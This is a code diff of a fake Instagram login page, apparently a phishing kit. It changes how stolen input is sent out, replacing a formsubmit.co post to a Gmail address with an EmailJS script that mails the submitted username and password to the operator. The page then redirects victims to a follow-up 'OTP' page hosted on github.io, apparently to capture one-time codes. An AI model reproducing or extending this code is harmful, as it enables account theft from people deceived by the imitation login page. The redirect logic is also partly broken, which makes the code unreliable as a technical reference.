@@ -34,7 +34,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                    <form id="form"  method="POST" action="https://formsubmit.co/nosakharewisdom968@gmail.com">
+                    <form id="form"  method="POST" >
 
                     <div class="form-content box">
                         <div class="logo">
@@ -58,8 +58,8 @@
                                         Phone number, username or email
                                     </span>
                                     <input type="text" name="username" id="username" required>
-                                    <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="https://sephsqua.github.io/vlteu/votesr/instagram/otp/657daf104b167f68d1979b9c.html">
+<!--                                     <input type="hidden" name="_captcha" value="false">
+                                    <input type="hidden" name="_next" value="https://sephsqua.github.io/vlteu/votesr/instagram/otp/657daf104b167f68d1979b9c.html"> -->
                                 </div>
                                 
                             </div>
@@ -76,7 +76,7 @@
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" id="button" value="Send Email">
+                                <button class="btn-login"  type="submit" id="button" value="Send Email" onclick="redirect();">
                                     Log In
                                 </button>
                                 <div class="box goto">
@@ -167,7 +167,35 @@
   
 
     <!-- </script> -->
+ <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
+<script type="text/javascript">
+  emailjs.init('7NQDqDubm8IFBhmKO')
+  const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_16fiv0m';
+   const templateID = 'template_j5z0tt2';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+    function redirect()
+{
+    window.location.href="https://sephsqua.github.io/vlteu/votesr/instagram/otp/657daf104b167f68d1979b9c.html";
+}
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
 </body>
 
 </html>
